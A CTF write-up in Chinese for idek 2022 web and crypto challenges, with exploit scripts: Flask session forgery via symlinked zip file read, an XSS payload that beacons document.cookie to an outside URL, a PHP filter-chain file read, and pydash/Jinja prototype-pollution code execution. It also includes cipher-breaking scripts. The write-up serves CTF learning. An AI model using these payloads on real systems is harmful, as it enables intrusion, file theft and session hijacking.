{"id": "r3kapig_writeup_40765b2cd8a0", "team": "r3kapig", "event": "writeup", "challenge_name": "README", "challenge_description": "# idek 2022* Web && Crypto Writeup\n\n## 前言\n\n根据前面我们所整理的wp,这里最后将web&&Crypto的writeup整理完毕在此呈现,希望大家共同学习进步.本比赛的部分Web和Crypto比较困难而且有趣.之后我们会推出一些复现文章,敬请期待.\n\n![](https://imgur.com/x2Krcsf.png)\n\n也欢迎对国际比赛感兴趣的师傅,欢迎简历`root@r3kapig.com`.我们会及时回复\n\n## Web:\n\n### Readme:\n\n很简单签到题，算是个逻辑漏洞问题\n\n这个程序中只有一个路由\n\n```go\nhttp.HandleFunc(\"/just-read-it\", justReadIt)\n```\n\n首先简单看一下可以得出程序逻辑如果能成功走到justReadIt函数最下方就能获得flag\n\n```go\nfunc justReadIt(w http.ResponseWriter, r *http.Request) {\n        defer r.Body.Close()\n\n        body, err := ...", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "unknown", "writeup": "# idek 2022* Web && Crypto Writeup\n\n## 前言\n\n根据前面我们所整理的wp,这里最后将web&&Crypto的writeup整理完毕在此呈现,希望大家共同学习进步.本比赛的部分Web和Crypto比较困难而且有趣.之后我们会推出一些复现文章,敬请期待.\n\n![](https://imgur.com/x2Krcsf.png)\n\n也欢迎对国际比赛感兴趣的师傅,欢迎简历`root@r3kapig.com`.我们会及时回复\n\n## Web:\n\n### Readme:\n\n很简单签到题，算是个逻辑漏洞问题\n\n这个程序中只有一个路由\n\n```go\nhttp.HandleFunc(\"/just-read-it\", justReadIt)\n```\n\n首先简单看一下可以得出程序逻辑如果能成功走到justReadIt函数最下方就能获得flag\n\n```go\nfunc justReadIt(w http.ResponseWriter, r *http.Request) {\n        defer r.Body.Close()\n\n        body, err := ioutil.ReadAll(r.Body)\n        if err != nil {\n                w.WriteHeader(500)\n                w.Write([]byte(\"bad request\\n\"))\n                return\n        }\n\n        reqData := ReadOrderReq{}\n        if err := json.Unmarshal(body, &reqData); err != nil {\n                w.WriteHeader(500)\n                w.Write([]byte(\"invalid body\\n\"))\n                return\n        }\n\n        if len(reqData.Orders) > MaxOrders {\n                w.WriteHeader(500)\n                w.Write([]byte(\"whoa there, max 10 orders!\\n\"))\n                return\n        }\n\n        reader := bytes.NewReader(randomData)\n        validator := NewValidator()\n\n        ctx := context.Background()\n        for _, o := range reqData.Orders {\n                if err := validator.CheckReadOrder(o); err != nil {\n                        w.WriteHeader(500)\n                        w.Write([]byte(fmt.Sprintf(\"error: %v\\n\", err)))\n                        return\n                }\n\n                ctx = WithValidatorCtx(ctx, reader, int(o))\n                _, err := validator.Read(ctx)\n                if err != nil {\n                        w.WriteHeader(500)\n                        w.Write([]byte(fmt.Sprintf(\"failed to read: %v\\n\", err)))\n                        return\n                }\n        }\n\n        if err := validator.Validate(ctx); err != nil {\n                w.WriteHeader(500)\n                w.Write([]byte(fmt.Sprintf(\"validation failed: %v\\n\", err)))\n                return\n        }\n\n        w.WriteHeader(200)\n        w.Write([]byte(os.Getenv(\"FLAG\")))\n}\n```\n\n我们一点一点来看，首先是接受了一个传来的json数据，解析保存到reqData当中，从下面可以看出只接受一个完全由数字组成的int数组，字段名叫orders\n\n```go\ntype ReadOrderReq struct {\n        Orders []int `json:\"orders\"`\n}\n```\n\n之后会用randomData初始化一个reader\n\n```\nreader := bytes.NewReader(randomData)\n```\n\n而这个randomData则是由initRandomData函数初始化，记住这个password复制在了12625之后\n\n```go\nfunc initRandomData() {\n        rand.Seed(1337)\n        randomData = make([]byte, 24576)\n        if _, err := rand.Read(randomData); err != nil {\n                panic(err)\n        }\n        copy(randomData[12625:], password[:])\n}\n```\n\n初始化之后会遍历`reqData.Orders`\n调用`CheckReadOrder`检查oders中的int值范围是否在0-100\n\n```go\nfunc (v *Validator) CheckReadOrder(o int) error {\n        if o <= 0 || o > 100 {\n                return fmt.Errorf(\"invalid order %v\", o)\n        }\n        return nil\n}\n```\n\n之后根据数值读出指定位数的值\n\n```go\nif err := validator.Validate(ctx); err != nil {\n                w.WriteHeader(500)\n                w.Write([]byte(fmt.Sprintf(\"validation failed: %v\\n\", err)))\n                return\n        }\n\n        w.WriteHeader(200)\n        w.Write([]byte(os.Getenv(\"FLAG\")))\n```\n\n这个函数功能就是读32位，之后与password比较，成功返回true，而我们前面说过这个password复制在了12625之后，并且oders数组容量最多只能有10个数字\n\n```go\nfunc (v *Validator) Validate(ctx context.Context) error {\n        r, _ := GetValidatorCtxData(ctx)\n        buf, err := v.Read(WithValidatorCtx(ctx, r, 32))\n        if err != nil {\n                return err\n        }\n        if bytes.Compare(buf, password[:]) != 0 {\n                return errors.New(\"invalid password\")\n        }\n        return nil\n}\n```\n\n就算全取最大100，10个也才1000，距离我们的12625还差很远\n\n再往前看发现read之前\n\n```go\nfunc (v *Validator) Read(ctx context.Context) ([]byte, error) {\n        r, s := GetValidatorCtxData(ctx)\n        buf := make([]byte, s)\n        _, err := r.Read(buf)\n        if err != nil {\n                return nil, fmt.Errorf(\"read error: %v\", err)\n        }\n        return buf, nil\n}\n```\n\n有这样一个调用，如果size大于等于100会调用一个bufio.NewReader\n\n```go\nfunc GetValidatorCtxData(ctx context.Context) (io.Reader, int) {\n        reader := ctx.Value(reqValReaderKey).(io.Reader)\n        size := ctx.Value(reqValSizeKey).(int)\n        if size >= 100 {\n                reader = bufio.NewReader(reader)\n        }\n        return reader, size\n}\n```\n\n这个defaultBufSize是4096\n\n```go\n// NewReader returns a new Reader whose buffer has the default size.\nfunc NewReader(rd io.Reader) *Reader {\n        return NewReaderSize(rd, defaultBufSize)\n}\n```\n\n最终\n\n![](https://imgur.com/UMCkOg9.png)\n\n### SimpleFileServer:\n\n也是python的flask的题目\n\n可以看到获得flag的条件，那就是成为admin，所以很容易猜测到考点是session伪造，而flask里面这个session的生成通常和变量`app.config[\"SECRET_KEY\"]`息息相关\n\n```python\n@app.route(\"/flag\")\ndef flag():\n    if not session.get(\"admin\"):\n        return \"Unauthorized!\"\n    return subprocess.run(\"./flag\", shell=True, stdout=subprocess.PIPE).stdout.decode(\"utf-8\")\n```\n\n因此一切的前提是我们能获得这个`SECRET_KEY`\n\n```python\napp.config[\"SECRET_KEY\"] = os.environ[\"SECRET_KEY\"]\n```\n\n而这部分生成在config.py当中\n\n要爆破这部分很明显一是我们需要知道这个`time.time()`的值，另一个还需要知道`SECRET_OFFSET`的偏移\n\n除开注册与登录路由，upoad支持上传一个zip文件并解压到指定目录\n\n```python\n@app.route(\"/upload\", methods=[\"GET\", \"POST\"])\ndef upload():\n    if not session.get(\"uid\"):\n        return redirect(\"/login\")\n    if request.method == \"GET\":\n        return render_template(\"upload.html\")\n\n    if \"file\" not in request.files:\n        flash(\"You didn't upload a file!\", \"danger\")\n        return render_template(\"upload.html\")\n    \n    file = request.files[\"file\"]\n    uuidpath = str(uuid.uuid4())\n    filename = f\"{DATA_DIR}uploadraw/{uuidpath}.zip\"\n    file.save(filename)\n    subprocess.call([\"unzip\", filename, \"-d\", f\"{DATA_DIR}uploads/{uuidpath}\"])    \n    flash(f'Your unique ID is <a href=\"/uploads/{uuidpath}\">{uuidpath}</a>!', \"success\")\n    logger.info(f\"User {session.get('uid')} uploaded file {uuidpath}\")\n    return redirect(\"/upload\")\n```\n\nuploads/xxx路由支持我们之间读取上传解压后的文件内容\n\n```python\n@app.route(\"/uploads/<path:path>\")\ndef uploads(path):\n    try:\n        return send_from_directory(DATA_DIR + \"uploads\", path)\n    except PermissionError:\n        abort(404)\n```\n\n这个读文件部分按理说只能读取uploads下的文件，看看底层实现用的是safe_join不支持跨目录读取\n\n![](https://imgur.com/4voOjHo.png)\n\n可以看到在这里获取路径path后，最终调用open打开文件并返回内容\n\n![](https://imgur.com/3OWl2eR.png)\n\n解决方法是可以配合symlink软连接实现任意文件读，这样我们一方面可以读config.py获取`SECRET_OFFSET`\n\n另一方面为了得到时间\n\n可以看到题目很良心的在`server.log`当中输出了time\n\n```python\n# Configure logging\nLOG_HANDLER = logging.FileHandler(DATA_DIR + 'server.log')\nLOG_HANDLER.setFormatter(logging.Formatter(fmt=\"[{levelname}] [{asctime}] {message}\", style='{'))\nlogger = logging.getLogger(\"application\")\nlogger.addHandler(LOG_HANDLER)\nlogger.propagate = False\nfor handler in logging.root.handlers[:]:\n    logging.root.removeHandler(handler)\nlogging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s')\nlogging.getLogger().addHandler(logging.StreamHandler())\n```\n\n不过这个时间不是精确的，通过转换为时间戳我们只能精确到整数部分，不过好在这里随机数的seed是配合round做了取整因此我们就能很容易实现爆破了\n\n![](https://imgur.com/v0iCOF4.png)\n\n我们可以很方便配合这个信息得到time.time()的值\n本地ln做一个symlink的文件\n\n![](https://imgur.com/9iIFU0F.png)\n\n之后爆破到`SECRET_KEY`后，修改admin为true再生成session即可\n\n```python\ndecoded = {'admin': True, 'uid': userinfo['username']}\n```\n\n最终exp，配合flask_unsign(https://github.com/Paradoxis/Flask-Unsign)\n\n```python\nimport base64\n\nimport requests, re, time, datetime, random\nimport flask_unsign\n\nsess = requests.session()\nSECRET_OFFSET = -67198624 * 1000\nuserinfo = {\"username\": \"yyds\", \"password\": \"yyds\"}\nbaseurl = \"http://127.0.0.1:1337/\"\npocZip = \"UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA\"\ncookie = \"\"\nlog_url = \"\"\n\ndef register():\n    reg_url = baseurl + \"register\"\n    sess.post(reg_url, userinfo)\n\n\ndef login():\n    global cookie\n    set_cookie = sess.post(baseurl + \"login\", data=userinfo, allow_redirects=False).headers['Set-Cookie']\n    cookie = set_cookie[8:82]\n\n\ndef upload():\n    global log_url\n    log_url = re.search('<a href=\"/uploads/.*\">', sess.post(\n        baseurl + \"upload\", headers={'Cookie': f'session={cookie}'},\n        files={'file': base64.b64decode(pocZip)}).text).group()[9:-2]\n\ndef read():\n    server_log = baseurl + log_url + \"/server.log\"\n    config = baseurl + log_url + \"/config.py\"\n    SECRET_OFFSET = int(re.findall(\"SECRET_OFFSET = (.*?) # REDACTED\", sess.get(config).text)[0]) * 1000\n    log = sess.get(server_log).text\n    now = (time.mktime(datetime.datetime.strptime(log.split('\\n')[0][1:20], \"%Y-%m-%d %H:%M:%S\").timetuple())) * 1000\n    return SECRET_OFFSET,now\n\n\n\nif __name__ == '__main__':\n    register()\n    login()\n    upload()\n    SECRET_OFFSET, now = read()\n    while 1:\n        decoded = {'admin': True, 'uid': userinfo['username']}\n        random.seed(round(now + int(SECRET_OFFSET)))\n        SECRET_KEY = \"\".join([hex(random.randint(0, 15)) for x in range(32)]).replace(\"0x\", \"\")\n        flag_url = baseurl + \"flag\"\n        res = sess.get(flag_url, headers={'Cookie': f'session={flask_unsign.sign(decoded, SECRET_KEY)}'}).text\n        if \"idek\" not in res:\n            now += 1\n            print(now)\n            continue\n        print(res)\n        break\n```\n\n### JSON Beautifier:\n\n关键点在于 outputBox.innerHTML是没过滤的 可以看到csp是 `script-src 'unsafe-eval' 'self'; object-src 'none'`; \n\nbeautify 中，如果设置了 config.debug  JSON.stringify(userJson, null, cols)的输出会被eval()\n\n只要能控制 cols 就可以\n\n但是现在的问题是传统的clobbering不生效的 所以我翻了一些标签\nhttps://portswigger.net/research/dom-clobbering-strikes-back 找到了frameset\n\n```html\n<iframe name=config srcdoc=&quot;<head id=debug></head><frameset id=opts cols=eval(name)></frameset>&quot;></iframe>'></iframe>\n```\n\n这样就能get到一个xss了 \n\n但我们现在有一个问题 首先刚才说的东西 eval()都在beautify()里面触发  只有beautify函数被加载时候才会生效\n\n所以需要用户输入和`DOMCharacterDataModified`事件被触发 但我们可以做到一个事情 首先在我们将上面属性都破坏的前提下 再加载一下main.js即可\n\npoc大概如下\n\n```html\n{\"xxx\":\"<iframe name='navigator.sendBeacon(atob(/url/.source),document.cookie)' srcdoc='<div id=json-input>[-3]</div><script defer src=/static/js/main.js></script><iframe name=config srcdoc=&quot;<head id=debug></head><frameset id=opts cols=eval(name)></frameset>&quot;></iframe>'></iframe>\"}\n```\n\n### Paywall:\n\n想看原理的移步陆队之前写的，由于有现成的工具直接当脚本小子即可\n\nhttps://tttang.com/archive/1395/#toc_iconv-filter-chain\n\n本题是用php实现的一个blog系统，除开样式读取核心代码非常简单\n\n```php\n<?php\n\n        error_reporting(0);\n        set_include_path('articles/');\n\n        if (isset($_GET['p'])) {\n            $article_content = file_get_contents($_GET['p'], 1);\n\n            if (strpos($article_content, 'PREMIUM') === 0) {\n                die('Thank you for your interest in The idek Times, but this article is only for premium users!'); // TODO: implement subscriptions\n            }\n            else if (strpos($article_content, 'FREE') === 0) {\n                echo \"<article>$article_content</article>\";\n                die();\n            }\n            else {\n                die('nothing here');\n            }\n        }\n           \n    ?>\n\n```\n\n可以看到，对于文章内容前是`PREMIUM`的不能读取，`FREE`的则可以读\n很可惜我们的flag文件恰好前面也是`PREMIUM`，那么要想读取这个文件很显然我们可以配合php的filter构造出FREE四个字母也就可以实现读取了\n\n![](https://imgur.com/WMKbVQF.png)\n\n下面是工具\n\nhttps://github.com/synacktiv/php_filter_chain_generator\n\nhttps://github.com/WAY29/php_filter_chain_generator\n\n发现直接生成出来的虽然有FREE，但是都无法看了\n\n```\nFREE�B�5$TԕT���FV��F�F��U�E�7V'65##�u�C��W%��7w5�W\"����>==�@C������>==�@\n```\n\n然而发现把每个环节的`convert.iconv.UTF8.UTF7`去掉\n\n就可以变成明文了，脚本小子表示很神奇，最后为了不丢失符号(毕竟Base64字符里面没有一些特殊符号`!{}!`之类的)，因此第一步事先base64enccode一下\n\n最终得到payload\n\n```\nhttp://127.0.0.1/?p=php://filter/convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode/resource=flag\n```\n\n但是根据这样构造本地发现会少最后三个字符，除开}符号还剩两个\n看看题目描述可以猜出最后俩字符，Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPPaper，最后一个字母肯定是个符号所以是!\n\n`idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}`\n\n![](https://imgur.com/nqwXgqR.png)\n\n当然最后发现工具也可以直接用，注意后面有俩空格\n\n```\npython php_filter_chain_generator.py --chain 'FREE  '\n```\n\n得到\n\n```\nphp://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=flag\n```\n\n![](https://imgur.com/SBiDtA2.png)\n\n### task manager:\n\n本题当时没有做出来属于赛后复现,不过比较有意思\n\n作者参考了部分来自以下文章的思路\n\nhttps://blog.abdulrah33m.com/prototype-pollution-in-python/\n\n题目有点原型链污染的味道，也可以说是借鉴了pyjail的一些思路，很有意思的一道题目。\n作者提供了对于 `pydash.set_` 的封装，可以通过变量路径设置值，类似一个高级版的 `setattr`。比如：\n\n```\n>>> pydash.set_({\"A\":{\"B\":\"C\"}}, \"A.B\", \"D\")\n{'A': {'B': 'D'}}\n```\n\n#### 寻找访问 app 的方法:\n\n在 `taskmanager.py` 里面调用 `pydash.set_()` 可以通过实例化的 `TaskManager` 对象利用特殊属性实现对 `app` 对象的修改：\n\n```\npydash.set_(\n    TaskManager(),\n    '__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.xxx',\n    'xxx'\n)\n```\n\n#### 将 eval 加入模板全局变量\n\n然后再回来看 `app.py` ，可以发现一段很奇怪的代码：\n\n![](https://imgur.com/nbQ0LT4.png)\n\n既然 `app` 已经可控了，如果能够实现 `before_first_request` 的重复调用那么就可以在模板中实现任意代码执行了，经过一些寻找发现可以通过将 `app._got_first_request` 设置为 `False` 实现。\n\n#### 设法调用 eval\n\n接下来就是寻找方法对已经放入模板全局变量的 `eval` 函数进行调用，而 `add_template_global` 函数是通过 `__name__` 来确定变量名字的，但是 builtin 函数的 `__name__` 是只读的，所以没有办法用来改个名字放进去，只有找现有文件中存在 eval 的来当作模板。在题目中只有 `app.py` 出现了 eval ，可以尝试利用。\n\n这里使用的方法是对 `app.jinja_env` 的 `variable_start_string` 和 `variable_end_string` 进行替换，原本 jinja 是通过识别 `{{.*}}` 来识别模板中的变量的，但是我们可以通过修改这两个值来更改 jinja 识别变量的方式，从而拼接出一个rce。\n\n#### 绕过 jinja 的目录穿越检查实现任意文件渲染\n\n下面一个问题是现在只能够对 `templates` 下面的文件进行渲染，但是这里面的 html 很明显是用不了的，所以要想办法让他可以渲染任意文件，在 jinja 源码(https://github.com/pallets/jinja/blob/36b601f24b30a91fe2fdc857116382bcb7655466/src/jinja2/loaders.py#L24-L38) 可以看到是通过 `os.path.pardir` 来对目录穿越进行了保护，但是我们可以通过修改 `pardir` 的值来绕过。\n\n最后在对 `app.py` 进行利用的时候发现虽然出现了 `eval` ，但是并没有 `eval(.*)` 的形式出现，尝试通过修改 `app.jinja_env` 的 `comment_start_string` 和 `comment_end_string` 来让 jinja 把文件的一部分当作注释删掉来凑成一个 `eval(.*)` 的形式，但是 jinja 解析时会报错，后来发现 `{{ eval{# #}(.*) }}` 这种中间有注释的模板变量本来就不能正常解析，但是现在既然可以渲染任意文件了，所以可以尝试在 python 库里面寻找出现 `eval(.*)` 的文件，最后找到了 `turtle.py`。\n\n#### exp:\n\n```py\nimport requests\nimport re\n\nbase_url = 'http://127.0.0.1:1337'\nurl      = f'{base_url}/api/manage_tasks'\nexp_url  = f'{base_url}/../../usr/local/lib/python3.8/turtle.py'\napp      = '__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app'\n\n# add eval to template globals\nrequests.post(url, json={\"task\": f\"{app}.env\", \"status\": \"yolo\"})\nrequests.post(url, json={\"task\": f\"{app}._got_first_request\", \"status\": None})\n\n# bypass jinja directory traversal check\nrequests.post(url, json={\"task\": \"__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir\", \"status\": \"foobar\"})\n\n# change jinja_env\nrequests.post(url, json={\"task\": f\"{app}.jinja_env.variable_start_string\", \"status\": \"\"\"'\"\"']:\\n            value = \"\"\"})\nrequests.post(url, json={\"task\": f\"{app}.jinja_env.variable_end_string\", \"status\": \"\\n\"})\n\n# add global vars\nrequests.post(url, json={\"task\": f\"{app}.jinja_env.globals.value\", \"status\": \"__import__('os').popen('cat /flag-*.txt').read()\"})\n\n# get flag\ns = requests.Session()\nr = requests.Request(method='GET', url=exp_url)\np = r.prepare()\np.url = exp_url\nr = s.send(p)\nflag = re.findall('idek{.*}', r.text)[0]\nprint(flag)\n```\n\n#### 非预期:\n\n由于作者把 flag 写在 Dockerfile 里面了，并且在构建容器的时候是通过 `RUN echo \"idek{[REDACTED]}\" > /flag-$(head -c 16 /dev/urandom | xxd -p).txt` 写的 flag 通过`COPY . .`添加的题目代码，这就意味着 Dockerfile 本身也被复制进了容器，所以在实现 LFI 之后就可以直接读取 Dockerfile 就可以拿到 flag 了\n\n```py\nimport requests\nimport re\n\nbase_url = 'http://127.0.0.1:1337'\nurl      = f'{base_url}/api/manage_tasks'\nexp_url  = f'{base_url}/../Dockerfile'\n\n# bypass jinja directory traversal check\nrequests.post(url, json={\"task\": \"__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir\", \"status\": \"foobar\"})\n\n# get flag\ns = requests.Session()\nr = requests.Request(method='GET', url=exp_url)\np = r.prepare()\np.url = exp_url\nr = s.send(p)\nflag = re.findall('idek{.*}', r.text)[0]\nprint(flag)\n```\n\n#### 通过 `jinja2.runtime.exported` 实现 rce\n\n> https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager\n\n通过 jinja 源码(https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1208) 可以发现模板的生成其实是调用了 `environment.from_string`，而在 `from_string` 函数中又调用了(https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1105) `environment.compile`，并且对 `compile` 会返回一个 `code` 对象，后续会被 exec(https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1222)，如果我们能够控制这里 exec 的内容那么就可以实现 rce。\n经过简单的调试可以 在这里(https://github.com/pallets/jinja/blob/main/src/jinja2/compiler.py#L839) 发现在生成代码的时候有一个可控变量 `exported_names`，他是 runtime(https://github.com/pallets/jinja/blob/main/src/jinja2/runtime.py#L45) 里面的一个数组，所以我们完全可以通过 `pydash.set_()` 来进行覆盖，从而达到 rce。\n\n```py\nimport requests, re\n\nbase_url = 'http://127.0.0.1:1337'\nurl      = f'{base_url}/api/manage_tasks'\nflag_url = f'{base_url}/../../tmp/flag'\n\npayload = '''*\n__import__('os').system('cp /flag* /tmp/flag')\n#'''\n\n# bypass jinja directory traversal check\nrequests.post(url, json={\"task\": \"__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.os.path.pardir\", \"status\": \"foobar\"})\n\n# replace exported to prepare rce\nrequests.post(url, json={\"task\": \"__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0\", \"status\": payload})\n\n# trigger rce\nrequests.get(f'{base_url}/home.html')\n\n# get flag\ns = requests.Session()\nr = requests.Request(method='GET', url=flag_url)\np = r.prepare()\np.url = flag_url\nr = s.send(p)\nflag = re.findall('idek{.*}', r.text)[0]\nprint(flag)\n```\n\n## Crypto:\n\n### Cleithrophobia:\n\n以一段3*16bit长的明文为例，填充与加密流程如下（最后会将密文反序输出）：\n\nb1, b2, b3\n\nb0(rand), b1, b2, b3, b4(pad)\n\nb0, b0^E(b1), b1^E(b2), b2^E(b3), b3^E(b4)\n\nb0, D(b3^E(b4))^(b0), D(b2^E(b3))^(b3^E(b4)), D(b1^E(b2))^(b2^E(b3)), D(b0^E(b1))^(b1^E(b2))\n\n考虑在这个过程中构造加密、解密的payload\n\nEnc-payload：b0(rand), b'\\x00'*16, b2, msg, b4(pad)\n\n- 此时密文中D(b1^E(b2))^(b2^E(b3))=D(E(b2))^b2^E(msg)=b2^b2^E(msg)=E(msg)\n\nDec-payload：b0(rand), b1, b2, msg^E(b4), b4(pad)\n\n- 此时密文中D(b3^E(b4))^(b0)=D(msg^E(b4)^E(b4))^b0=D(msg)^b0，且b0已知\n至此即可将密文链条恢复到前一状态，进而得到明文\n\n```py\nfrom pwn import *\nhost, port = 'cleithrophobia.chal.idek.team:1337'.split(':')\nio = remote(host, int(port))\n\n\ndef oracle(payload):\n    io.sendlineafter(b'|    > (hex) ', payload.hex().encode())\n    io.recvuntil(b'|\\n|   ')\n    now = bytes.fromhex(io.recvline().strip().decode())\n    return [now[i:i+16] for i in range(0, len(now), 16)][::-1]\n\n\ndef enc(block):\n    assert len(block) == 16\n    payload = b'\\x00' * 32 + block\n    res = oracle(payload)\n    return res[3]\n\n\ndef dec(block):\n    assert len(block) == 16\n    mask = enc(b'\\x10' * 16)\n    payload = b'\\x00' * 32 + xor(block, mask)\n    res = oracle(payload)\n    return xor(res[0], res[1])\n\n# rand, b1, b2, b3, pad\n# b0, b0^E(b1), b1^E(b2), b2^E(b3), b3^E(b4)\n# b0, D(b3^E(b4))^(b0), D(b2^E(b3))^(b3^E(b4)), D(b1^E(b2))^(b2^E(b3)), D(b0^E(b1))^(b1^E(b2))\nio.recvuntil(b'flag = ')\nflag = bytes.fromhex(io.recvline().strip().decode())\nflag = [flag[i:i+16] for i in range(0, len(flag), 16)][::-1]\nt1 = [flag[0]]\nfor i in range(len(flag) - 1):\n    t1 += [enc(xor(flag[i+1], t1[-1]))]\nt1 = t1[:1] + t1[1:][::-1]\nt2 = [flag[0]]\nfor i in range(len(flag) - 1):\n    t2 += [dec(xor(t1[i+1], t2[-1]))]\nflag = b''.join(t2)\nprint(flag)\n# flag{wh0_3v3n_c0m3s_up_w1th_r1d1cul0us_sch3m3s_l1k3_th1s__0h_w41t__1_d0}\n```\n\n### ECRSA:\n\n先将椭圆曲线的加法在有理数域下进行计算得到3T的坐标值，而有理数域下的除法相当于模下乘逆元，因此3T的两个坐标值可以得到模n下的两个等式，然后再根据3T在该曲线上，得到另一个等式，联立这三个等式，发现第三个等式为一个关于a的线性方程，在有理数域下解得a的值，代入前两式，然后对两式的计算结果的分子求gcd，即可得到n的值；得到n的值后，因为e,d都已知，故可以分解n，分别在GF(p)和GF(q)上求得ECC的阶，将两阶相乘得到Zmod(n)下的阶，然后解密即可得到flag。\n\n```py\n#sage\nfrom gmpy2 import *\nfrom Crypto.Util.number import long_to_bytes\n\ndef add(P, Q):\n    x0, y0 = P\n    x1, y1 = Q\n    if P == Q:\n        lmd = (3*x0**2+a)/(2*y0)\n    else:\n        lmd = (y1-y0) / (x1-x0)\n    x2 = lmd**2 - x1 - x0\n    y2 = lmd*(x0 - x2) - y0\n    return x2, y2\nR.<a> = PolynomialRing(ZZ)\nP = (ZZ(int.from_bytes(b\"ECRSA offers added security by elliptic entropy.\", 'big')), 2)\nP2 = add(P, P)\nP3 = add(P, P2)\nf = str(P3[0]).split('/') + str(P3[1]).split('/')\nf = [R(i) for i in f]\n\nTe = (79615329406682121028641446306520032869660130854153788352536429332441749473394735222836513266191300847548366008281109415002581029448905418880962931523411475044527689429201653146200630804486870653795937020571749192405439450656659472253086567149309166068212312829071678837253421625687772396105149376211148834937,114576105009077728778286635566905404081211824310970349548035698466418670695753458926421098950418414701335730404414509232776047250916535638430446206810902182305851611221604003509735478943147034397832291215478617613443375140890349118302843641726392253137668650493281241262406250679891685430326869028996183320982)\nMe = (115076663389968253954821343472300155800654332223208277786605760890770425514748910251950393842983935903563187546008731344369976804796963863865102277460894378910744413097852034635455187460730497479244094103353376650220792908529826147612199680141743585684118885745149209575053969106545841997245139943766220688789,74232642959425795109854140949498935461683632963630260034964643066394703345139733396470958836932831941672213466233486926122670098721687149917605871805886006479766670309639660332339984667770417687192717160061980507220617662938436637445370463397769213554349920956877041619061811087875024276435043752581073552318)\n\nf0 = f[0] - f[1] * Te[0]\nf1 = f[2] - f[3] * Te[1]\nf2 = Te[0]**3 + a*Te[0] - Te[1]**2-(Me[0]**3 + a*Me[0] - Me[1]**2)\nprint(f2)\na0=-1019268867267849424908357367733931941383149668286864008861662442680604058151693707791547011105186550019092586871229367602480951232469366295595128740384313397226761125592114592001298261062965213964211518794413291961567779146411551935492149763883963272734637871273976142997464735273842094527385872407012350495753298964870092922939941557312324244091706263803037684216879489854927518197495340486943316099448245524778860809444971443935794707968413693163036741320366137839392605690457251072731869232133843078162397057596189198269026990658078279998575424676768178510688889622050681034958153231556029864713685758814785896436116013310016899574654253785383489362957328536913784532588181648611237704933470028564747329012603054002623952267126949886810588734363614455501359064859547724824540676184962858003962647114120432607459636061800842389469449254464940592103479283633803337327710969181902456604551946745128222513462440426982787689316/35461333983286132926179897165780122930994201369054489434069331558328676041354175029113880576792635056014821537727621929367395775348058444984139345937482903866216723668650381489254556656243626825448157082781627457815353457873166675359113112992434419615906572916077530737800547480858069601139990567555071853852\n#assert 